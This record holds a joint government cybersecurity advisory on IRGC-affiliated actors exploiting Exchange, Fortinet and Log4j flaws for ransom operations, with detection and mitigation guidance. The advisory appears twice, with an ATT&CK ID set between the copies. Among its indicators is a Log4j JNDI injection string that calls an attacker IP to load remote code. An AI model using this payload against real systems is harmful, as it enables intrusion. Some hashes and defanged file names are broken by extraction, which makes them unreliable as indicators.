C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
C:\inetpub\wwwroot\aspnet_client\



The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:

${jndi:ldap//148.251.71.182:1389/RCE} (user agent string)
RCE.class

Execution [TA0002]
The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:

Wininet
Wininet’
WinLogon
CacheTask

Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Persistence [TA0003]
The IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories [T1136.001, T1136.002]. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain administrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:

Domain Admin
it_admin
DefaultAccount
Default01

Note: For additional account usernames associated with this activity, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Exfiltration [TA0010]
The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs are associated with data exfiltration from targeted entity networks:

C:\Windows\Temp\sassl[.]pmd
C:\Windows\Temp\ssasl[.]zip
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zip

Impact [TA0040]
The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and held the decryption keys for ransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on the targeted entity’s networked printer(s). The notes included the following contact information:

@BuySafety (Telegram)
@WeRBits (Telegram)
+93794415076 (WhatsApp)
werbits@onionmail[.]org
buysafety@onionmail[.]org
yacashcash@rambler[.]ru

Note: For additional contact information included in ransom notes, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
DETECTION
The authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet devices, and/or VMware Horizon applications investigate potential suspicious activity in their networks.

Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.

Note: Refer to Appendix A for IOCs.


Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-2021- 45105.
Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-2021- 34523, and CVE-2021-31207.
As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021- 31196, CVE-2021-31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470 because the authoring agencies have seen the actors broadly target Microsoft Exchange servers.
Investigate exposed Microsoft Exchange servers, both patched and unpatched, for compromise.
Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.
Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware security advisory page.
Investigate changes to RDP, firewall, and Windows Remote Management (WinRM) configurations that may allow malicious cyber actors to maintain persistent access.
Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.
Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks—including each step these tasks perform—for unrecognized “actions.”
Review antivirus logs for indications they were unexpectedly turned off.
Look for WinRAR and FileZilla in unexpected locations.
Review servers and workstations for malicious executable files masquerading as legitimate Windows processes. Malicious files may not be found in the expected directory and may have cmd.exe or powershell.exe as their parent process.

Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Mitigations

The authoring agencies urge network defenders to prepare for and mitigate potential cyber threats immediately by implementing the mitigations below.
Implement and Enforce Backup and Restoration Policies and Procedures

Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware or other destructive data incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and with an independent offline backup.
Create, maintain, and exercise a basic cyber incident response plan that includes response procedures for a ransom incident.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud).

Patch and Update Systems

U.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure organizations: Implement free CISA Cyber Hygiene Services Vulnerability Scanning to enable continuous scans of public, static IPs for accessible services and vulnerabilities.
Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check software updates and end-of-life notifications. Consider leveraging a centralized patch management system to automate and expedite the process.
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021- 34473, CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-2021- 31207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-31196, CVE-2021- 31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.

Evaluate and Update Blocklists and Allowlists

Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist. Prevent any attempts to install or run this program and its associated files.

Implement Network Segmentation

Implement network segmentation to restrict a malicious threat actor’s lateral movement.

Secure User Accounts

Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties.
Require administrator credentials to install software.

Implement Multifactor Authentication

Use multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.

Use Strong Passwords

Require all accounts with password logins to have strong, unique passwords. See CISA Tip Choosing and Protecting Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.

Secure and Monitor RDP and other Potentially Risky Services

If you use RDP, restrict it to limit access to resources over internal networks. After assessing risks, if your organization deems RDP operationally necessary, restrict the originating sources, and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts (to block brute force campaigns), and log RDP login attempts.

Use Antivirus Programs

Install and regularly update antivirus and anti-malware software on all hosts.

Secure Remote Access

Only use secure networks.
Consider installing and using a VPN for remote access.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Appendix B).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS
If a ransomware or extortion incident occurs at your organization:

Follow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Follow the notification requirements as outlined in your cyber incident response plan.

U.S. organizations: Report incidents to FBI at a local FBI Field Office or the FBI's 24/7 CyWatch at (855)292-3937 or cywatch@fbi.gov, CISA’s 24/7 Operations Center at SayCISA@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472), or the U.S. Secret Service (USSS) at a USSS Field Office.
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours)


Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: The authoring agencies strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.
RESOURCES

The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
For more information on malicious cyber activity affiliated with the Iranian government- sponsored malicious cyber activity, see us-cert.cisa.gov/Iran and FBI’s Iran Threat page.
For information and resources on protecting against and responding to ransomware or extortion activity, refer to StopRansomware.gov, the U.S. centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate malicious activity.
ACSC can provide tailored cyber security advice and assistance, reporting, and incident response support at cyber.gov.au and via 1300 292 371 (1300 CYBER1).

PURPOSE
This advisory was developed by U.S., Australian, Canadian, and UK cybersecurity authorities in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, USCC-CNMF, DoT, ACSC, CCCS, and NCSC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring.
APPENDIX A: INDICATORS OF COMPROMISE
IP addresses and executables files are listed below. For a downloadable copy of IOCs, see AA22- 257A.stix.
IP Addresses

54.39.78[.]148
95.217.193[.]86
104.168.117[.]149
107.173.231[.]114
144.76.186[.]88
148.251.71[.]182
172.245.26[.]118
185.141.212[.]131
198.12.65[.]175
198.144.189[.]74

Note: Some of these observed IP addresses may be outdated. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.
Malicious Domains

newdesk[.]top
symantecserver[.]co
msupdate[.]us
msupdate[.]top
gupdate[.]us
aptmirror[.]eu
buylap[.]top
winstore[.]us
tcp443[.]org
mssync[.]one
upmirror[.]top
tcp443 (subdomain)
kcp53 (subdomain)

Files
Malicious files observed in this activity are identified in Table 1. Many of the below malicious files are masquerading as legitimate Windows files; therefore, file names alone should not be treated as an indicator of compromise. Note: For additional malicious files observed, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.



Filename:
Wininet[.]xml


Path:
C:\Windows\Temp\wininet[.]xml


MD5:
d2f4647a3749d30a35d5a8faff41765e


SHA-1:
0f676bc786db3c44cac4d2d22070fb514b4cb64c


SHA-256:
559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e


Filename:
Wininet’[.]xml


MD5:
2e1e17a443dc713f13f45a9646fc2179


SHA-1:
e75bfc0dd779d9d8ac02798b090989c2f95850dc


Filename:
WinLogon[.]xml


Path:
C:\Windows\Temp\WinLogon[.]xml


MD5:
49c71178fa212012d710f11a0e6d1a30


SHA-1:
226f0fbb80f7a061947c982ccf33ad65ac03280f


SHA-256:
bcc2e4d96e7418a85509382df6609ec9a53b3805effb7ddaed093bdaf949b6ea


Filename:
Wininet[.]bat


Path:
C:\Windows\wininet[.]bat


MD5:
5f098b55f94f5a448ca28904a57c0e58


SHA-1:
27102b416ef5df186bd8b35190c2a4cc4e2fbf37


SHA-256:
668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0


Filename:
Winlogon[.]bat


Path:
C:\Windows\winlogon[.]bat


MD5:
7ac4633bf064ebba9666581b776c548f


SHA-1:
524443dd226173d8ba458133b0a4084a172393ef


SHA-256:
d14d546070afda086a1c7166eaafd9347a15a32e6be6d5d029064bfa9ecdede7


Filename:
CacheTask[.]bat


Path:
C:\\ProgramData\Microsoft\CacheTask[.]bat


MD5:
ee8fd6c565254fe55a104e67cf33eaea


SHA-1:
24ed561a1ddbecd170acf1797723e5d3c51c2f5d


SHA-256:
c1723fcad56a7f18562d14ff7a1f030191ad61cd4c44ea2b04ad57a7eb5e2837






Filename:
Task_update[.]exe


Path:
C:\Windows\Temp\task_update[.]exe


MD5:
cacb64bdf648444e66c82f5ce61caf4b


SHA-1:
3a6431169073d61748829c31a9da29123dd61da8


SHA-256:
12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a


Filename:
Task[.]exe


MD5:
5b646edb1deb6396082b214a1d93691b


SHA-1:
763ca462b2e9821697e63aa48a1734b10d3765ee


SHA-256:
17e95ecc7fedcf03c4a5e97317cfac166b337288562db0095ccd24243a93592f


Filename:
dllhost[.]exe


Path:
C:\Windows\dllhost[.]exe


MD5:
0f8b592126cc2be0e9967d21c40806bc
9a3703f9c532ae2ec3025840fa449d4e


SHA-1:
3da45558d8098eb41ed7db5115af5a2c6 1c543af
8ece87086e8b5aba0d1cc4ec3804bf74e 0b45bee


SHA-256:
724d54971c0bba8ff32aeb6044d3b3fd57 1b13a4c19cada015ea4bcab30cae26

1604e69d17c0f26182a3e3ff65694a4945
0aafd56a7e8b21697a932409dfd81e



Filename:
svchost[.]exe


Path:
C:\Windows\svchost[.]exe


MD5:
68f58e442fba50b02130eedfc5fe4e5b
298d41f01009c6d6240bc2dc7b769205


SHA-1:

76dd6560782b13af3f44286483e157848
efc0a4e

6ca62f4244994b5fbb8a46bdfe62aa1c95 8cebbd


SHA-256:
b04b97e7431925097b3ca4841b894139 7b0b88796da512986327ff66426544ca
8aa3530540ba023fb29550643beb00c9c 29f81780056e02c5a0d02a1797b9cd9


Filename:
User[.]exe


Path:
C:\Windows\Temp\user[.]exe


MD5:
bd131ebfc44025a708575587afeebbf3
f0be699c8aafc41b25a8fc0974cc4582


SHA-1:
8b23b14d8ec4712734a5f6261aed40942 c9e0f68
6bae2d45bbd8c4b0a59ba08892692fe86 e596154


SHA-256:
b8a472f219658a28556bab4d6d109fdf3 433b5233a765084c70214c973becbbd
7b5fbbd90eab5bee6f3c25aa3c2762104 e219f96501ad6a4463e25e6001eb00b






Filename:
Setup[.]bat


Path:
C:\Users\DefaultAccount\Desktop\New folder\setup[.]bat


MD5:
7fdc2d007ef0c1946f1f637b87f81590


Filename:
Ssasl[.]pmd


Path:
C:\Windows\Temp\ssasl[.]pmd


Filename:
Ssasl[.]zip


Path:
C:\Windows\Temp\ssasl[.]zip


Filename:
netscanold[.]exe


Path:
C:\Users\DefaultAccount\Desktop\netscanold\netscanold[.]exe


Filename:
scan[.]csv


Path:
C:\Users\DefaultAccount\Desktop\scan[.]csv


Filename:
lsass[.]dmp


Path:
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp


Filename:
lsass[.]zip


Path:
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zip



 
APPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUES
Table 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.
 

Table 2: Observed Tactics and Techniques


Tactic
Technique


Resource Development ]TA0042]
Obtain Capabilities: Malware [T1588.001]


Obtain Capabilities: Tool [T1588.002]


Initial Access [TA0001]
Exploit Public-Facing Application [T1190]


Execution [TA0002]
Scheduled Task/Job: Scheduled Task [T1053.005]


Persistence [TA0003]
Create Account: Local Account [T1136.001]


Create Account: Domain Account [T1136.002]


Privilege Escalation [TA0004]
 


Credential Access [TA0006]
 


Collection [TA0009]
Archive Collected Data: Archive via Utility [T1560.001]


Exfiltration [TA0010]
 


Impact [TA0040]
Data Encrypted for Impact [T1486]




Revisions

September 14, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'TA0003', 'T1190', 'TA0009', 'T1560.001', 'T1136.001', 'TA0040', 'T1486', 'TA0001', 'TA0042', 'T1588.001', 'T1136.002', 'T1053.005', 'TA0004', 'T1588.002', 'TA0010', 'TA0002'}","




Summary

Actions to take today to protect against ransom operations:• Keep systems and software updated and prioritize remediating known exploited vulnerabilities.• Enforce MFA.• Make offline backups of your data.
This joint Cybersecurity Advisory (CSA) is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), U.S. Cyber Command (USCC) - Cyber National Mission Force (CNMF), the Department of the Treasury (Treasury), the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight continued malicious cyber activity by advanced persistent threat (APT) actors that the authoring agencies assess are affiliated with the Iranian Government’s Islamic Revolutionary Guard Corps (IRGC). Note: The IRGC is an Iranian Government agency tasked with defending the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as ""the authoring agencies.""
This advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors exploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in furtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group affiliated with the IRGC.
Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGC-affiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom operations.
The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted entities or sectors.
This advisory provides observed tactics, techniques, and indicators of compromise (IOCs) that the authoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
For a downloadable copy of IOCs, see AA22-257A.stix.
For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threat webpage.
Download the PDF version of this report: pdf, 836 kb

Technical Details

Threat Actor Activity
As reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for and/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, and CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these APT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious activities, including deployment of tools to support ransom and extortion operations, and data exfiltration.
Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for initial access.
The IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data. Depending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor uses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.
IRGC-affiliated actor activity observed by the authoring agencies includes:

In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.
In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors used their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom. This activity disrupted the transportation company’s operations for an extended period.
In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the network, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.
In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies assess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.

MITRE ATT&CK® Tactics and Techniques
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE ATT&CK tactics and techniques observed.
The authoring agencies assess the following tactics and techniques are associated with this activity.
Resource Development,
The IRGC-affiliated actors have used the following malicious and legitimate tools, for a variety of tactics across the enterprise spectrum:

Fast Reverse Proxy (FRP) for command and control (C2)
Plink for C2
Remote Desktop Protocol (RDP) for lateral movement
BitLocker for data encryption
SoftPerfect Network Scanner for system network configuration discovery

Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Initial Access,
As stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting known vulnerabilities,.
The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:

Web shells with naming conventions aspx_,11 randomly generated alphabetic characters,.aspx, login.aspx, or default.aspx in any of the following directories:

C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
C:\inetpub\wwwroot\aspnet_client\



The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:

${jndi:ldap//148.251.71.182:1389/RCE} (user agent string)
RCE.class

Execution,
The IRGC-affiliated actors may have made modifications to the Task Scheduler,. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:

Wininet
Wininet’
WinLogon
CacheTask

Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Persistence,
The IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories,. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain administrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:

Domain Admin
it_admin
DefaultAccount
Default01

Note: For additional account usernames associated with this activity, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
Exfiltration,
The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs are associated with data exfiltration from targeted entity networks:

C:\Windows\Temp\sassl,.,pmd
C:\Windows\Temp\ssasl,.,zip
C:\Users\DefaultAccount\AppData\Local\Temp\lsass,.,dmp
C:\Users\DefaultAccount\AppData\Local\Temp\lsass,.,zip

Impact,
The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data, and held the decryption keys for ransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on the targeted entity’s networked printer(s). The notes included the following contact information:

@BuySafety (Telegram)
@WeRBits (Telegram)
+93794415076 (WhatsApp)
werbits@onionmail,.,org
buysafety@onionmail,.,org
yacashcash@rambler,.,ru

Note: For additional contact information included in ransom notes, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.
DETECTION
The authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet devices, and/or VMware Horizon applications investigate potential suspicious activity in their networks.

Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.

Note: Refer to Appendix A for IOCs.


Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-2021- 45105.
Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-2021- 34523, and CVE-2021-31207.
As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021- 31196, CVE-2021-31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470 because the authoring agencies have seen the actors broadly target Microsoft Exchange servers.
Investigate exposed Microsoft Exchange servers, both patched and unpatched, for compromise.
Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.
Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware security advisory page.
Investigate changes to RDP, firewall, and Windows Remote Management (WinRM) configurations that may allow malicious cyber actors to maintain persistent access.
Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.
Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks—including each step these tasks perform—for unrecognized “actions.”
Review antivirus logs for indications they were unexpectedly turned off.
Look for WinRAR and FileZilla in unexpected locations.
Review servers and workstations for malicious executable files masquerading as legitimate Windows processes. Malicious files may not be found in the expected directory and may have cmd.exe or powershell.exe as their parent process.

Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Mitigations

The authoring agencies urge network defenders to prepare for and mitigate potential cyber threats immediately by implementing the mitigations below.
Implement and Enforce Backup and Restoration Policies and Procedures

Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware or other destructive data incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and with an independent offline backup.
Create, maintain, and exercise a basic cyber incident response plan that includes response procedures for a ransom incident.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud).

Patch and Update Systems

U.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure organizations: Implement free CISA Cyber Hygiene Services Vulnerability Scanning to enable continuous scans of public, static IPs for accessible services and vulnerabilities.
Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check software updates and end-of-life notifications. Consider leveraging a centralized patch management system to automate and expedite the process.
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021- 34473, CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-2021- 31207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-31196, CVE-2021- 31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.

Evaluate and Update Blocklists and Allowlists

Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist. Prevent any attempts to install or run this program and its associated files.

Implement Network Segmentation

Implement network segmentation to restrict a malicious threat actor’s lateral movement.

Secure User Accounts

Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties.
Require administrator credentials to install software.

Implement Multifactor Authentication

Use multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.

Use Strong Passwords

Require all accounts with password logins to have strong, unique passwords. See CISA Tip Choosing and Protecting Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.

Secure and Monitor RDP and other Potentially Risky Services

If you use RDP, restrict it to limit access to resources over internal networks. After assessing risks, if your organization deems RDP operationally necessary, restrict the originating sources, and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts (to block brute force campaigns), and log RDP login attempts.

Use Antivirus Programs

